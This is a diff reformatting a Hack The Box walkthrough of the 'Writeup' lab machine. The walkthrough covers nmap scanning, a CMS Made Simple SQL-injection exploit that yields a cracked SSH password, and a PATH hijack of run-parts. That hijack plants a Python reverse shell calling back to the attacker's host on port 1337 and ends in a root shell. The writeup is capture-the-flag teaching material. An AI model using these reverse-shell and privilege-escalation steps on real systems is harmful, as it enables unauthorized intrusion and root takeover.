@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Writeup"
-date:   2019-10-13 15:35:00 +0800
-categories: hackthebox
-tags: linux cmsmadesimple ssh
+title: Hack The Box - Writeup
+date: 2019-10-13 15:35:00 +0800
+categories: [hackthebox]
+tags: [linux, cmsmadesimple, ssh]
 ---
 
 ![](/assets/images/writeup.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 Always remember to map a domain name to the machine's IP address to ease your rooting !
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.138 writeup.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sS writeup.htb -p 1-65535 -T4
 Nmap scan report for writeup.htb (10.10.10.138)
 Host is up (0.25s latency).
@@ -31,7 +30,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 250.07 seconds
-{% endhighlight %}
+```
 
 Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, lets see if we can gather any information or exploit it ?
 
@@ -54,7 +53,7 @@ This looks like a blog containing writeups of different HTB machines ? No wonder
 
 Checking the source of the page, we find out that the website is using `CMS Made Simple`. Maybe we can find some exploits for it ?
 
-{% highlight bash %}
+```bash
 $ searchsploit CMS Made Simple
 ------------------------------------------------------------------------------ ----------------------------------------
  Exploit Title                                                                |  Path
@@ -89,13 +88,13 @@ CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Uploa | 
 ------------------------------------------------------------------------------ ----------------------------------------
 Shellcodes: No Result
 Papers: No Result
-{% endhighlight %}
+```
 
 Oh wow there are so many exploits! But which one do we use ? 
 
 After some trial and error, the one that worked for me was `CMS Made Simple < 2.2.10 - SQL Injection`. Using the `--crack` option and specifying `rockyou.txt` as the wordlist,
 
-{% highlight bash %}
+```bash
 $ python  /usr/share/exploitdb/exploits/php/webapps/46635.py -h
 Usage: 46635.py [options]
 
@@ -112,7 +111,7 @@ $ python CVE-2019-9053.py -u http://writeup.htb/writeup --crack -w /usr/share/wo
 [+] Email found: jkr@writeup.htb
 [+] Password found: 62def4866937f08cc13bab43bb14e6f7
 [+] Password cracked: raykayjay9
-{% endhighlight %}
+```
 
 Neat ! We got the password for user `jkr`!
 
@@ -120,7 +119,7 @@ Neat ! We got the password for user `jkr`!
 
 If we try to access `ssh` into `jkr`'s account using the credentials we found,
 
-{% highlight bash %}
+```bash
 $ ssh jkr@writeup.htb
 jkr@writeup.htb's password: 
 Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
@@ -136,7 +135,7 @@ jkr@writeup:~$ ls
 user.txt
 jkr@writeup:~$ cat user.txt
 d4e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 
 # Enumeration
@@ -144,16 +143,16 @@ d4e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 As `jkr`, we need to know what processes are being runned on the machine. To do so, I will be using [pspy](https://github.com/DominicBreuker/pspy). To transfer it from my machine to this machine, I will be using `python`'s `SimpleHTTPServer` module.
 
 On my machine:
-{% highlight bash %}
+```bash
 $ mkdir httpserver
 $ cd httpserver
 $ cp ~/Downloads/pspy64 .
 $ python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
-{% endhighlight %}
+```
 
 On the `Writeup` machine:
-{% highlight bash %}
+```bash
 jkr@writeup:~$ cd /tmp
 jkr@writeup:/tmp$ wget http://10.10.XXX.XXX/pspy64
 --2019-08-28 22:59:29--  http://10.10.XXX.XXX/pspy64
@@ -168,44 +167,44 @@ pspy64                        100%[=============================================
 
 jkr@writeup:/tmp$ chmod 777 pspy64
 jkr@writeup:/tmp$ ./pspy64
-{% endhighlight %}
+```
 
 After monitoring for a while, we see some commands being run as `root`,
-{% highlight bash %}
+```bash
 2019/08/28 23:02:25 CMD: UID=0    PID=2313   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
 /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
 2019/08/28 23:02:25 CMD: UID=0    PID=2314   | run-parts --lsbsysinit /etc/update-motd.d
-{% endhighlight %}
+```
 
 For the first command, it is mainly setting the `$PATH` environment variable which determines where the system looks for executables. For the second command, it is running the `run-parts` command.
 
 When I checked where the `run-parts` executable was located,
-{% highlight bash %}
+```bash
 jkr@writeup:/tmp$ which run-parts
 /bin/run-parts
-{% endhighlight %}
+```
 
 `run-parts` was found at `/bin` but `/bin` is not the first location that the system will look for executables. How can we take advantage of this fact ? If we create an executable called `run-parts` at `/usr/local/sbin`, the system will execute that instead of the `run-parts` at `/bin`! 
 
 # Privilege Escalation
 
-{% highlight bash %}
+```bash
 jkr@writeup:/tmp$ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
 nect((\"10.10.XXX.XXX\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
 ([\"/bin/sh\",\"-i\"]);'" > /usr/local/sbin/run-parts
 jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts
-{% endhighlight %}
+```
 
 For the executable, it is a script that contains the command that establishes a reverse shell back to our listener.
 
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
 After a long while, I realised that I was not catching any connections from the `Writeup` machine. Is the `run-parts` not getting run ? Lets run `pspy` again to find out why!
 
-{% highlight bash %}
+```bash
 2019/08/28 23:52:51 CMD: UID=0    PID=26053  | sshd: [accepted]
 2019/08/28 23:52:51 CMD: UID=0    PID=26054  | sshd: [accepted]  
 2019/08/28 23:52:55 CMD: UID=0    PID=26055  | sshd: jkr [priv]  
@@ -219,51 +218,51 @@ After a long while, I realised that I was not catching any connections from the 
 2019/08/28 23:54:31 CMD: UID=0    PID=26079  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
 /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
 2019/08/28 23:54:31 CMD: UID=0    PID=26080  | run-parts --lsbsysinit /etc/update-motd.d 
-{% endhighlight %}
+```
 
 By some chance, I noticed that the 2 commands were being run every time someone has logged in via `ssh`! So lets try this again...
 
 # root.txt
 
 On my machine (listener):
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
 On the `Writeup` machine:
-{% highlight bash %}
+```bash
 jkr@writeup:/tmp$ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
 nect((\"10.10.XXX.XXX\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
 ([\"/bin/sh\",\"-i\"]);'" > /usr/local/sbin/run-parts
 jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts
-{% endhighlight %}
+```
 
 Again on my machine (on another terminal):
-{% highlight bash %}
+```bash
 $ ssh jkr@writeup.htb
 jkr@writeup.htb's password:
 
-{% endhighlight %}
+```
 
 Again on my machine (listener):
-{% highlight bash %}
+```bash
 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.138] 59722
 /bin/sh: 0: can't access tty; job control turned off
 # id
 uid=0(root) gid=0(root) groups=0(root)
-{% endhighlight %}
+```
 
 We are in!
 
-{% highlight bash %}
+```bash
 # cd /root
 # ls
 bin
 root.txt
 # cat root.txt
 eebaXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
 
